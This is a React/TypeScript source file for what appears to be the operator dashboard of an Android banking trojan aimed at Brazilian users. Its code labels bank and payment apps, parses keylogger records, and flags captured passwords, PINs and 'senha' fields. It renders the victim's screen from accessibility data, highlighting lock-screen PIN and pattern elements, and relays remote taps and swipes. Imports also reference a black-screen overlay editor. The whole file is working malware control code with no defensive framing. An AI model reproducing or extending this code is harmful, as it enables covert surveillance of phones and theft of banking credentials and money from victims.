import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { devicesAPI, getApiBaseUrl } from '../services/api';
import DeviceScreen from '../components/DeviceScreen';
import BlackScreenEditor, { PREDEFINED_BLACK_SCREEN_TEMPLATES } from '../components/BlackScreenEditor';
import StructuredNotesManager from '../components/StructuredNotesManager';
import VoiceCallModal from '../components/VoiceCallModal';
import type { Device } from '../types';
import { formatConnectedDays } from '../utils/mapDeviceToCliente';
import itauLogoUrl from '../assets/banks/itau.svg';
import nubankLogoUrl from '../assets/banks/nubank.svg';
import caixaTemIconUrl from '../assets/banks/caixa_tem_icon.png';
import caixaLogoUrl from '../assets/banks/caixa.svg';
import sicrediLogoUrl from '../assets/banks/sicredi.svg';

import {
  ArrowLeft,
  Smartphone,
  Tv,
  Camera,
  Eye,
  Folder,
  MessageSquare,
  Package,
  Keyboard,
  Users,
  MapPin,
  Mic,
  MicOff,
  Calendar,
  Battery,
  BatteryCharging,
  Mail,
  AtSign,
  ShieldCheck,
  ShieldAlert,
  Volume2,
  VolumeX,
  Volume1,
  Radio,
  RefreshCw,
  Lock,
  Unlock,
  Play,
  Pause,
  Search,
  Download,
  Trash2,
  Send,
  Sliders,
  EyeOff,
  ExternalLink,
  Phone,
  PhoneIncoming,
  PhoneOff,
  UserCheck,
  Building2,
  Activity,
  Layers,
  Sparkles,
  Syringe,
  Sun,
  Moon,
  Square,
  File,
  X,
  CheckCircle2,
  AlertCircle,
  Bell,
  Settings,
  Grid,
  Edit3,
  Palette,
  Zap,
  Key,
  KeyRound,
  Copy,
  Hash,
  Globe,
  PanelLeftClose,
  PanelLeftOpen,
  FileText,
  Bot,
  Target,
  XCircle
} from 'lucide-react';

const SCREEN_BASE_WIDTH = 1080;
const SCREEN_BASE_HEIGHT = 2400;

const getAppIcon = (pkgName?: string, appName?: string) => {
  const p = (pkgName || '').toLowerCase();
  const a = (appName || '').toLowerCase();

  // ItaÃº
  if (p.includes('itau') || a.includes('itau') || a.includes('itaÃº')) {
    return (
      <img src={itauLogoUrl} alt="ItaÃº" className="w-4 h-4 rounded-md object-contain shrink-0 bg-[#ec7000] p-0.5 shadow-sm" />
    );
  }

  // Nubank
  if (p.includes('nubank') || p.includes('nu.production') || a.includes('nubank')) {
    return (
      <img src={nubankLogoUrl} alt="Nubank" className="w-4 h-4 rounded-md object-contain shrink-0 bg-[#820ad1] p-0.5 shadow-sm" />
    );
  }

  // Caixa Tem
  if (p.includes('caixa.tem') || a.includes('caixa tem')) {
    return (
      <img src={caixaTemIconUrl} alt="Caixa Tem" className="w-4 h-4 rounded-md object-contain shrink-0 bg-[#005ca9] p-0.5 shadow-sm" />
    );
  }

  // Caixa EconÃ´mica
  if (p.includes('caixa') || a.includes('caixa')) {
    return (
      <img src={caixaLogoUrl} alt="Caixa" className="w-4 h-4 rounded-md object-contain shrink-0 bg-[#005ca9] p-0.5 shadow-sm" />
    );
  }

  // Sicredi
  if (p.includes('sicredi') || a.includes('sicredi')) {
    return (
      <img src={sicrediLogoUrl} alt="Sicredi" className="w-4 h-4 rounded-md object-contain shrink-0 bg-[#357c2c] p-0.5 shadow-sm" />
    );
  }

  // Bradesco
  if (p.includes('bradesco') || a.includes('bradesco')) {
    return (
      <div className="w-4 h-4 rounded-md bg-red-600 flex items-center justify-center text-[8px] font-black text-white shrink-0 shadow-sm">
        B
      </div>
    );
  }

  // Santander
  if (p.includes('santander') || a.includes('santander')) {
    return (
      <div className="w-4 h-4 rounded-md bg-red-700 flex items-center justify-center text-[8px] font-black text-white shrink-0 shadow-sm">
        S
      </div>
    );
  }

  // Banco Inter
  if (p.includes('inter') || a.includes('banco inter')) {
    return (
      <div className="w-4 h-4 rounded-md bg-orange-500 flex items-center justify-center text-[8px] font-black text-white shrink-0 shadow-sm">
        IN
      </div>
    );
  }

  // C6 Bank
  if (p.includes('c6') || a.includes('c6')) {
    return (
      <div className="w-4 h-4 rounded-md bg-zinc-900 border border-amber-500/50 flex items-center justify-center text-[8px] font-black text-amber-400 shrink-0 shadow-sm">
        C6
      </div>
    );
  }

  // PagBank / PagSeguro
  if (p.includes('pagbank') || p.includes('pagseguro') || a.includes('pagbank') || a.includes('pagseguro')) {
    return (
      <div className="w-4 h-4 rounded-md bg-rose-600 flex items-center justify-center text-[8px] font-black text-white shrink-0 shadow-sm">
        P$
      </div>
    );
  }

  // Mercado Pago
  if (p.includes('mercadopago') || a.includes('mercado pago')) {
    return (
      <div className="w-4 h-4 rounded-md bg-pink-500 flex items-center justify-center text-[8px] font-black text-white shrink-0 shadow-sm">
        MP
      </div>
    );
  }

  // PicPay
  if (p.includes('picpay') || a.includes('picpay')) {
    return (
      <div className="w-4 h-4 rounded-md bg-rose-500 flex items-center justify-center text-[8px] font-black text-white shrink-0 shadow-sm">
        PP
      </div>
    );
  }

  // WhatsApp
  if (p.includes('whatsapp') || a.includes('whatsapp')) {
    return (
      <div className="w-4 h-4 rounded-md bg-rose-600 flex items-center justify-center text-white shrink-0 shadow-sm">
        <MessageSquare className="w-2.5 h-2.5 fill-current" />
      </div>
    );
  }

  // Instagram
  if (p.includes('instagram') || a.includes('instagram')) {
    return (
      <div className="w-4 h-4 rounded-md bg-gradient-to-tr from-amber-500 via-rose-500 to-purple-600 flex items-center justify-center text-white shrink-0 shadow-sm">
        <Camera className="w-2.5 h-2.5" />
      </div>
    );
  }

  // Facebook
  if (p.includes('facebook') || p.includes('katana') || a.includes('facebook')) {
    return (
      <div className="w-4 h-4 rounded-md bg-red-600 flex items-center justify-center text-white font-black text-[9px] shrink-0 shadow-sm">
        f
      </div>
    );
  }

  // Telegram
  if (p.includes('telegram') || a.includes('telegram')) {
    return (
      <div className="w-4 h-4 rounded-md bg-pink-500 flex items-center justify-center text-white shrink-0 shadow-sm">
        <Send className="w-2.5 h-2.5" />
      </div>
    );
  }

  // Chrome / Browser
  if (p.includes('chrome') || p.includes('browser') || a.includes('chrome') || a.includes('navegador')) {
    return (
      <div className="w-4 h-4 rounded-md bg-red-500/20 border border-red-400/40 flex items-center justify-center text-red-400 shrink-0 shadow-sm">
        <Globe className="w-2.5 h-2.5" />
      </div>
    );
  }

  // Configurar / Settings
  if (p.includes('settings') || a.includes('configur') || a.includes('ajustes') || a.includes('settings')) {
    return (
      <div className="w-4 h-4 rounded-md bg-slate-700/80 border border-slate-500/50 flex items-center justify-center text-slate-200 shrink-0 shadow-sm">
        <Settings className="w-2.5 h-2.5" />
      </div>
    );
  }

  // Telefone / Call
  if (p.includes('dialer') || p.includes('phone') || p.includes('telef') || a.includes('telefone') || a.includes('chamada')) {
    return (
      <div className="w-4 h-4 rounded-md bg-rose-600 flex items-center justify-center text-white shrink-0 shadow-sm">
        <Phone className="w-2.5 h-2.5" />
      </div>
    );
  }

  // Mensagens / SMS
  if (p.includes('messaging') || p.includes('mms') || p.includes('sms') || a.includes('mensagem')) {
    return (
      <div className="w-4 h-4 rounded-md bg-red-600 flex items-center justify-center text-white shrink-0 shadow-sm">
        <MessageSquare className="w-2.5 h-2.5" />
      </div>
    );
  }

  // Ãcone GenÃ©rico de App
  const firstLetter = (appName || pkgName || 'A').charAt(0).toUpperCase();
  return (
    <div className="w-4 h-4 rounded-md bg-red-950/80 border border-red-500/40 flex items-center justify-center text-[8.5px] font-black text-pink-300 shrink-0 shadow-sm">
      {firstLetter}
    </div>
  );
};

const getCleanAppName = (pkgName?: string, appName?: string): string => {
  if (
    appName &&
    typeof appName === 'string' &&
    appName.trim() &&
    appName !== 'App' &&
    appName !== 'desconhecido' &&
    appName !== pkgName &&
    !appName.includes('.')
  ) {
    return appName.trim();
  }
  const p = (pkgName || appName || '').toLowerCase();
  if (p.includes('telegram')) return 'Telegram';
  if (p.includes('whatsapp')) return 'WhatsApp';
  if (p.includes('launcher')) return 'Tela Inicial';
  if (p.includes('itau') || p.includes('itaÃº')) return 'ItaÃº';
  if (p.includes('bradesco')) return 'Bradesco';
  if (p.includes('nubank')) return 'Nubank';
  if (p.includes('santander')) return 'Santander';
  if (p.includes('inter')) return 'Banco Inter';
  if (p.includes('caixa') || p.includes('gabba')) return 'Caixa';
  if (p.includes('c6')) return 'C6 Bank';
  if (p.includes('sicredi')) return 'Sicredi';
  if (p.includes('pagbank') || p.includes('pagseguro')) return 'PagBank';
  if (p.includes('mercadopago') || p.includes('mercado pago')) return 'Mercado Pago';
  if (p.includes('picpay')) return 'PicPay';
  if (p.includes('chrome')) return 'Google Chrome';
  if (p.includes('instagram')) return 'Instagram';
  if (p.includes('facebook')) return 'Facebook';
  if (p.includes('gmail')) return 'Gmail';
  if (p.includes('youtube')) return 'YouTube';
  if (p.includes('tiktok')) return 'TikTok';
  if (p.includes('settings')) return 'ConfiguraÃ§Ãµes';
  if (p.includes('systemui')) return 'Sistema Android';
  
  const target = pkgName || appName || '';
  if (target && target.includes('.')) {
    const parts = target.split('.');
    const last = parts[parts.length - 1];
    if (last && last.length > 2) return last.charAt(0).toUpperCase() + last.slice(1);
  }
  if (appName && appName.trim() && !appName.includes('.')) return appName.trim();
  return 'Aplicativo';
};

const formatNotificationTime = (notif: any): string => {
  const rawTime = notif.timestamp || notif.created_at || notif.time;
  if (!rawTime) return 'Agora';
  try {
    const d = new Date(rawTime);
    if (!isNaN(d.getTime())) {
      const dateStr = d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' });
      const timeStr = d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
      return `${dateStr} ${timeStr}`;
    }
  } catch (e) {}
  return String(rawTime);
};



export interface ParsedKeylogItem {
  id: any;
  appName: string;
  package: string;
  text: string;
  hint: string;
  fieldName: string;
  isPassword: boolean;
  isOffline: boolean;
  timeStr: string;
  dateStr: string;
  displayCategory: 'password' | 'typed' | 'window' | 'click' | 'info';
  mainText: string;
  subInfo: string;
}

const parseKeylogRecord = (k: any): ParsedKeylogItem => {
  let parsed: any = {};

  if (k && typeof k.data === 'string') {
    const trimmed = k.data.trim();
    if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
      try {
        parsed = JSON.parse(trimmed);
      } catch {
        parsed = {};
      }
    } else if (trimmed.includes('"package":') || trimmed.includes('"text":')) {
      try {
        const start = trimmed.indexOf('{');
        const end = trimmed.lastIndexOf('}');
        if (start !== -1 && end !== -1 && end > start) {
          parsed = JSON.parse(trimmed.substring(start, end + 1));
        }
      } catch {
        parsed = {};
      }
    }
  } else if (k && typeof k.data === 'object' && k.data !== null) {
    parsed = k.data;
  }

  if (k && typeof k.text === 'string') {
    const trimmed = k.text.trim();
    if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
      try {
        const p = JSON.parse(trimmed);
        parsed = { ...p, ...parsed };
      } catch {}
    }
  }

  const pkg = parsed.package || parsed.pkg || k.package || k.pkg || '';
  const appName = getCleanAppName(pkg, parsed.appName || parsed.app || k.appName || k.app);

  let text = '';
  if (parsed.text !== undefined && parsed.text !== null) {
    text = parsed.text.toString();
  } else if (k.text !== undefined && k.text !== null && typeof k.text === 'string' && !k.text.trim().startsWith('{')) {
    text = k.text.toString();
  }

  const hint = (parsed.hint || k.hint || '').toString().trim();
  const fieldName = (parsed.fieldName || k.fieldName || '').toString().trim();
  const eventType = (parsed.eventType || k.eventType || '').toString().trim();

  const isPassword = !!(
    parsed.isPassword ||
    k.isPassword ||
    (text && (text.includes('ðŸ”‘') || text.toLowerCase().includes('senha') || /^\d{4,8}$/.test(text.trim()))) ||
    fieldName.toLowerCase().includes('senha') ||
    fieldName.toLowerCase().includes('pin') ||
    fieldName.toLowerCase().includes('password') ||
    hint.toLowerCase().includes('senha') ||
    hint.toLowerCase().includes('pin')
  );

  const isOffline = !!(k.isOffline || parsed.isOffline);

  let timeStr = 'Agora';
  let dateStr = '';
  const rawTime = parsed.timestamp || k.timestamp || k.created_at || parsed.created_at;
  if (rawTime) {
    try {
      const d = new Date(rawTime);
      if (!isNaN(d.getTime())) {
        timeStr = d.toLocaleTimeString('pt-BR');
        dateStr = d.toLocaleDateString('pt-BR');
      } else {
        timeStr = rawTime.toString();
      }
    } catch {
      timeStr = rawTime.toString();
    }
  }

  let displayCategory: 'password' | 'typed' | 'window' | 'click' | 'info' = 'typed';
  let mainText = '';
  let subInfo = '';

  if (isPassword && text && text.trim().length > 0) {
    displayCategory = 'password';
    mainText = text.trim();
    if (fieldName || hint) subInfo = `Campo: ${fieldName || hint}`;
  } else if (text && text.trim().length > 0) {
    displayCategory = 'typed';
    mainText = text.trim();
    if (fieldName || hint) subInfo = `Campo: ${fieldName || hint}`;
  } else if (eventType.startsWith('WINDOW_CHANGED') || eventType.includes('QuickstepLauncher') || eventType.includes('Activity')) {
    displayCategory = 'window';
    const activityPart = eventType.replace('WINDOW_CHANGED:', '').trim();
    const shortActivity = activityPart ? activityPart.split('.').pop() || activityPart : '';
    mainText = shortActivity ? `Tela aberta: ${shortActivity}` : 'Aplicativo em uso';
    subInfo = activityPart || '';
  } else if (eventType.includes('CLICK') || eventType.includes('TOUCH')) {
    displayCategory = 'click';
    mainText = fieldName ? `Toque: ${fieldName}` : (hint ? `Toque: ${hint}` : 'Toque na tela');
    if (hint && fieldName) subInfo = hint;
  } else if (fieldName || hint) {
    displayCategory = 'info';
    mainText = `Campo ativo: ${fieldName || hint}`;
  } else if (eventType) {
    displayCategory = 'info';
    mainText = eventType;
  } else {
    if (typeof k.data === 'string' && !k.data.trim().startsWith('{')) {
      mainText = k.data.trim();
    } else {
      mainText = 'Atividade registrada';
    }
  }

  return {
    id: k.id,
    appName,
    package: pkg,
    text,
    hint,
    fieldName,
    isPassword,
    isOffline,
    timeStr,
    dateStr,
    displayCategory,
    mainText,
    subInfo
  };
};

type ScreenReaderNode = {
  bounds?: { x: number; y: number; w: number; h: number };
  children?: ScreenReaderNode[];
  text?: string;
  desc?: string;
  hint?: string;
  class?: string;
  id?: string;
  clickable?: boolean;
  editable?: boolean;
  password?: boolean;
  focused?: boolean;
  isKeyboard?: boolean;
  checked?: boolean;
  enabled?: boolean;
  scrollable?: boolean;
  longClickable?: boolean;
  selected?: boolean;
  isLockScreen?: boolean;
  isLockElement?: boolean;
  isPinDigit?: boolean;
  isPatternLock?: boolean;
  isSwipeUnlock?: boolean;
  windowType?: number;
  windowPackage?: string;
  patternGrid?: { x: number; y: number; r?: number }[];
  gridRows?: number;
  gridCols?: number;
  swipeHint?: { sx: number; sy: number; ex: number; ey: number };
};

const safeRoundRect = (
  ctx: CanvasRenderingContext2D,
  x: number,
  y: number,
  w: number,
  h: number,
  r: number
) => {
  if (typeof (ctx as any).roundRect === 'function') {
    try {
      (ctx as any).roundRect(x, y, w, h, r);
      return;
    } catch {
      // Fallback
    }
  }
  const rad = Math.min(Math.abs(r), Math.abs(w) / 2, Math.abs(h) / 2);
  ctx.moveTo(x + rad, y);
  ctx.arcTo(x + w, y, x + w, y + h, rad);
  ctx.arcTo(x + w, y + h, x, y + h, rad);
  ctx.arcTo(x, y + h, x, y, rad);
  ctx.arcTo(x, y, x + w, y, rad);
};

const isInputField = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  return (
    node.editable === true ||
    node.password === true ||
    className.includes('edittext') ||
    className.includes('textinput') ||
    className.includes('inputfield') ||
    className.includes('textfield')
  );
};

const isKeyboardKey = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  const id = node.id?.toLowerCase() || '';
  if ((node as any).isKeyboardKey === true) return true;
  if (className.includes('key') || className.includes('keyboard') || id.includes('key') || id.includes('keyboard')) return true;
  if (node.clickable === true && node.bounds != null) {
    const { w, h } = node.bounds;
    if (w >= 30 && w <= 250 && h >= 40 && h <= 180) {
      const ratio = w / h;
      if (ratio >= 0.5 && ratio <= 3) return true;
    }
  }
  return false;
};

const isLockScreenElement = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  const id = node.id?.toLowerCase() || '';
  return (
    node.isLockScreen === true ||
    node.isLockElement === true ||
    node.isPinDigit === true ||
    node.isPatternLock === true ||
    node.isSwipeUnlock === true ||
    className.includes('keyguard') ||
    className.includes('lockpattern') ||
    className.includes('pinview') ||
    id.includes('keyguard') ||
    id.includes('lock') ||
    id.includes('pin')
  );
};

const collectAllVisibleNodes = (node: ScreenReaderNode, nodes: ScreenReaderNode[]) => {
  if (!node || !node.bounds) return;
  const { x, y, w, h } = node.bounds;
  if (x + w < -100 || y + h < -100) return;
  if (w < 4 || h < 4) return;
  const hasDetails = node.text || node.desc || node.hint || node.password || node.clickable || node.editable || node.isPinDigit || node.id;
  if (!node.children || (Array.isArray(node.children) && node.children.length === 0) || hasDetails) {
    nodes.push(node);
  }
  if (node.children && Array.isArray(node.children)) {
    node.children.forEach((child) => collectAllVisibleNodes(child, nodes));
  }
};

const getNodeKey = (node: ScreenReaderNode): string => {
  if (node.id) return node.id;
  const b = node.bounds || { x: 0, y: 0, w: 0, h: 0 };
  const text = node.text?.trim() || node.desc?.trim() || '';
  return `node_${b.x}_${b.y}_${b.w}_${b.h}_${text}`;
};

const drawElement = (
  ctx: CanvasRenderingContext2D,
  node: ScreenReaderNode,
  textScale: number = 1.0,
  _cornerStyle: 'brackets' | 'full-border' = 'brackets',
  customizations: Record<
    string,
    {
      customText?: string;
      customColor?: string;
      textColor?: string;
      fontSize?: number;
      opacity?: number;
      glow?: number;
      fontWeight?: string;
      badge?: string;
      borderStyle?: 'square' | 'rounded';
    }
  > = {},
  searchQuery: string = '',
  isSelected: boolean = false,
  isHovered: boolean = false,
  theme: 'cyber' | 'matrix' | 'gold' | 'purple' = 'cyber',
  v2GlobalTextScale: number = 1.0,
  v2GlobalOpacity: number = 40,
  v2GlobalBorderStyle: 'rounded' | 'square' = 'rounded',
  v2GlobalBlockColor: string = '',
  v2GlobalTextColor: string = ''
) => {
  if (!node || !node.bounds) return;
  const { x, y, w, h } = node.bounds;
  const nodeKey = getNodeKey(node);
  const custom = customizations[nodeKey];

  let text = custom?.customText || node.text?.trim() || node.desc?.trim() || '';

  const nodeAny = node as any;
  if (!text && nodeAny.extra_text) text = nodeAny.extra_text;
  if (!text && nodeAny.extra_label) text = nodeAny.extra_label;

  if (node.password && text) {
    const dotCount = (text.match(/â€”/g) || []).length;
    text = dotCount > 0 ? `ðŸ”‘ [${dotCount} dÃ­gitos]` : `ðŸ”‘ ${text}`;
  } else if (node.password && !text) {
    text = 'ðŸ”‘ [SENHA]';
  } else if (node.editable && !text && node.hint) {
    text = `â€œ ${node.hint}`;
  }

  const isInput = isInputField(node);
  const isKey = isKeyboardKey(node);
  const isLock = isLockScreenElement(node);
  const isSearchMatch = Boolean(searchQuery && text && text.toLowerCase().includes(searchQuery.toLowerCase()));

  const borderStyle = custom?.borderStyle || v2GlobalBorderStyle;
  const isSquare = borderStyle === 'square';
  const radius = isSquare ? 0 : Math.min(18, w / 4, h / 4);

  let bgColor = 'rgba(15, 23, 42, 0.7)';
  let borderColor = 'rgba(100, 116, 139, 0.4)';
  let textColor = custom?.textColor || v2GlobalTextColor || '#F1F5F9';
  let borderWidth = custom?.glow ? custom.glow * 1.5 : 1;

  const targetBlockColor = custom?.customColor || v2GlobalBlockColor;
  const targetOpacity = typeof custom?.opacity === 'number' ? custom.opacity : (v2GlobalOpacity / 100);

  if (theme === 'matrix') {
    bgColor = `rgba(6, 40, 20, ${targetOpacity})`;
    borderColor = 'rgba(16, 185, 129, 0.5)';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#D1FAE5';
  } else if (theme === 'gold') {
    bgColor = `rgba(45, 30, 10, ${targetOpacity})`;
    borderColor = 'rgba(245, 158, 11, 0.5)';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#FEF3C7';
  } else if (theme === 'purple') {
    bgColor = `rgba(35, 15, 55, ${targetOpacity})`;
    borderColor = 'rgba(168, 85, 247, 0.5)';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#F3E8FF';
  }

  if (targetBlockColor) {
    borderColor = targetBlockColor;
    const hex = targetBlockColor.replace('#', '');
    const r = parseInt(hex.substring(0, 2), 16) || 6;
    const g = parseInt(hex.substring(2, 4), 16) || 182;
    const b = parseInt(hex.substring(4, 6), 16) || 212;
    bgColor = `rgba(${r}, ${g}, ${b}, ${targetOpacity})`;
    if (!custom?.glow) borderWidth = 2;
  } else if (node.password) {
    bgColor = `rgba(220, 38, 38, ${targetOpacity})`;
    borderColor = '#EF4444';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#FEF2F2';
    borderWidth = 2;
  } else if (isInput) {
    bgColor = `rgba(22, 163, 74, ${targetOpacity})`;
    borderColor = '#22C55E';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#F0FDF4';
    borderWidth = 2;
  } else if (isKey) {
    bgColor = `rgba(30, 41, 59, ${targetOpacity})`;
    borderColor = 'rgba(148, 163, 184, 0.5)';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#F8FAFC';
    borderWidth = 1;
  } else if (node.clickable) {
    bgColor = `rgba(37, 99, 235, ${targetOpacity})`;
    borderColor = '#ff4d6d';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#EFF6FF';
    borderWidth = 1.5;
  } else if (isLock) {
    bgColor = `rgba(99, 102, 241, ${targetOpacity})`;
    borderColor = '#6366F1';
    if (!custom?.textColor && !v2GlobalTextColor) textColor = '#EEF2FF';
    borderWidth = 2;
  }

  if (isSearchMatch) {
    bgColor = 'rgba(245, 158, 11, 0.6)';
    borderColor = '#F59E0B';
    textColor = '#FFFFFF';
    borderWidth = 3;
  }

  ctx.fillStyle = bgColor;
  ctx.beginPath();
  if (isSquare) {
    ctx.rect(x, y, w, h);
  } else {
    safeRoundRect(ctx, x, y, w, h, radius);
  }
  ctx.fill();

  ctx.strokeStyle = borderColor;
  ctx.lineWidth = borderWidth;

  ctx.beginPath();
  if (isSquare) {
    ctx.rect(x, y, w, h);
    ctx.stroke();
  } else {
    safeRoundRect(ctx, x, y, w, h, radius);
    ctx.stroke();
  }

  // Visual highlight when hovered from side list or canvas
  if (isHovered) {
    ctx.save();
    ctx.fillStyle = 'rgba(0, 240, 255, 0.35)';
    ctx.beginPath();
    if (isSquare) {
      ctx.rect(x - 3, y - 3, w + 6, h + 6);
    } else {
      safeRoundRect(ctx, x - 3, y - 3, w + 6, h + 6, radius + 3);
    }
    ctx.fill();

    ctx.strokeStyle = '#ff1e4d';
    ctx.lineWidth = 3.5;
    ctx.shadowColor = '#ff1e4d';
    ctx.shadowBlur = 18;
    ctx.stroke();

    const cornerLen = Math.min(14, Math.max(6, w / 3), Math.max(6, h / 3));
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 2.5;
    ctx.shadowColor = '#ff1e4d';
    ctx.shadowBlur = 8;
    
    // Top-Left corner
    ctx.beginPath();
    ctx.moveTo(x - 6, y - 6 + cornerLen);
    ctx.lineTo(x - 6, y - 6);
    ctx.lineTo(x - 6 + cornerLen, y - 6);
    ctx.stroke();

    // Top-Right corner
    ctx.beginPath();
    ctx.moveTo(x + w + 6 - cornerLen, y - 6);
    ctx.lineTo(x + w + 6, y - 6);
    ctx.lineTo(x + w + 6, y - 6 + cornerLen);
    ctx.stroke();

    // Bottom-Left corner
    ctx.beginPath();
    ctx.moveTo(x - 6, y + h + 6 - cornerLen);
    ctx.lineTo(x - 6, y + h + 6);
    ctx.lineTo(x - 6 + cornerLen, y + h + 6);
    ctx.stroke();

    // Bottom-Right corner
    ctx.beginPath();
    ctx.moveTo(x + w + 6 - cornerLen, y + h + 6);
    ctx.lineTo(x + w + 6, y + h + 6);
    ctx.lineTo(x + w + 6, y + h + 6 - cornerLen);
    ctx.stroke();

    ctx.restore();
  }

  if (isSelected) {
    ctx.save();
    ctx.strokeStyle = '#ff1e4d';
    ctx.lineWidth = 3;
    ctx.shadowColor = '#ff1e4d';
    ctx.shadowBlur = 10;
    ctx.beginPath();
    if (isSquare) {
      ctx.rect(x - 2, y - 2, w + 4, h + 4);
    } else {
      safeRoundRect(ctx, x - 2, y - 2, w + 4, h + 4, radius + 2);
    }
    ctx.stroke();
    ctx.restore();
  }

  // Draw Badge if custom badge exists
  if (custom?.badge && w > 30 && h > 20) {
    ctx.save();
    ctx.font = '10px sans-serif';
    ctx.fillStyle = '#FFFFFF';
    ctx.textAlign = 'right';
    ctx.fillText(custom.badge, x + w - 4, y + 12);
    ctx.restore();
  }

  if (text) {
    ctx.save();
    let fontSize = custom?.fontSize;
    
    // Scale text if not using custom fixed size
    if (!fontSize) {
      const textLen = text.length;
      const maxFontByHeight = Math.floor(h * 0.55);
      const maxFontByWidth = Math.floor((w - 12) / (textLen * 0.52));
      fontSize = Math.max(10, Math.min(22, maxFontByHeight, maxFontByWidth));
      if (isKey && text.length <= 2) fontSize = Math.min(28, h * 0.5);
    }
    fontSize = Math.round(fontSize * textScale * v2GlobalTextScale);

    const fontW = custom?.fontWeight || '700';

    ctx.font = `${fontW} ${fontSize}px "Segoe UI", -apple-system, sans-serif`;
    ctx.fillStyle = textColor;
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';

    let displayText = text;
    if (!custom?.fontSize && v2GlobalTextScale <= 1.2) {
      const maxWidth = w - 8;
      let measured = ctx.measureText(displayText);
      while (measured.width > maxWidth && displayText.length > 1) {
        displayText = displayText.slice(0, -1);
        measured = ctx.measureText(displayText + 'â€¦');
      }
      if (displayText !== text) displayText = displayText + 'â€¦';
    }

    ctx.fillText(displayText, x + w / 2, y + h / 2);
    ctx.restore();
  }
};

const ScreenReaderCanvas = ({
  hierarchy,
  onNodeClick,
  onSwipe,
  onNodeSelect,
  textScale = 1.0,
  v2Mode = 'edit',
  v2SearchQuery = '',
  v2Customizations = {},
  selectedNodeKey = null,
  hoveredNodeKey = null,
  onNodeHover = null,
  v2Theme = 'cyber',
  v2GlobalTextScale = 1.0,
  v2GlobalOpacity = 40,
  v2GlobalBorderStyle = 'rounded',
  v2GlobalBlockColor = '',
  v2GlobalTextColor = ''
}: {
  hierarchy?: ScreenReaderNode;
  onNodeClick?: (x: number, y: number, normX?: number, normY?: number) => void;
  onSwipe?: (x1: number, y1: number, x2: number, y2: number, normX1: number, normY1: number, normX2: number, normY2: number, duration: number) => void;
  onNodeSelect?: (node: ScreenReaderNode | null) => void;
  textScale?: number;
  v2Mode?: 'action' | 'edit' | 'search' | 'add_hotspot';
  v2SearchQuery?: string;
  v2Customizations?: Record<string, { customText?: string; customColor?: string; badge?: string; macroAction?: string }>;
  selectedNodeKey?: string | null;
  hoveredNodeKey?: string | null;
  onNodeHover?: ((nodeKey: string | null) => void) | null;
  v2Theme?: 'cyber' | 'matrix' | 'gold' | 'purple';
  v2GlobalTextScale?: number;
  v2GlobalOpacity?: number;
  v2GlobalBorderStyle?: 'rounded' | 'square';
  v2GlobalBlockColor?: string;
  v2GlobalTextColor?: string;
}) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const devW = hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
  const devH = hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
  const pointerStartRef = useRef<{ clientX: number; clientY: number; normX: number; normY: number; time: number } | null>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d', { alpha: false });
    if (!ctx) return;

    try {
      const dpr = window.devicePixelRatio || 1;
      const targetW = Math.floor(devW * dpr);
      const targetH = Math.floor(devH * dpr);

      if (canvas.width !== targetW || canvas.height !== targetH) {
        canvas.width = targetW;
        canvas.height = targetH;
      }

      ctx.setTransform(1, 0, 0, 1, 0, 0);
      ctx.scale(dpr, dpr);

      // Theme Background (Preto puro como o VNC)
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, devW, devH);

      if (hierarchy) {
        const allNodes: ScreenReaderNode[] = [];
        collectAllVisibleNodes(hierarchy, allNodes);
        allNodes.sort((a, b) => {
          const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
          const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
          return areaB - areaA;
        });
        allNodes.forEach((node) => {
          const key = getNodeKey(node);
          const isSelected = selectedNodeKey === key;
          const isHovered = hoveredNodeKey === key;
          drawElement(
            ctx,
            node,
            textScale,
            'brackets',
            v2Customizations,
            v2SearchQuery,
            isSelected,
            isHovered,
            v2Theme,
            v2GlobalTextScale,
            v2GlobalOpacity,
            v2GlobalBorderStyle,
            v2GlobalBlockColor,
            v2GlobalTextColor
          );
        });
      }

    } catch (err) {
      console.warn('ScreenReaderCanvas render error:', err);
    }
  }, [
    hierarchy,
    devW,
    devH,
    textScale,
    v2Mode,
    v2SearchQuery,
    v2Customizations,
    selectedNodeKey,
    hoveredNodeKey,
    v2Theme,
    v2GlobalTextScale,
    v2GlobalOpacity,
    v2GlobalBorderStyle,
    v2GlobalBlockColor,
    v2GlobalTextColor
  ]);

  const handlePointerDown = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const normX = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
    const normY = Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height));

    pointerStartRef.current = {
      clientX: e.clientX,
      clientY: e.clientY,
      normX,
      normY,
      time: Date.now()
    };

    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch (err) {}
  };

  const handlePointerUp = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const start = pointerStartRef.current;
    pointerStartRef.current = null;

    try {
      e.currentTarget.releasePointerCapture(e.pointerId);
    } catch (err) {}

    if (!start) return;

    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
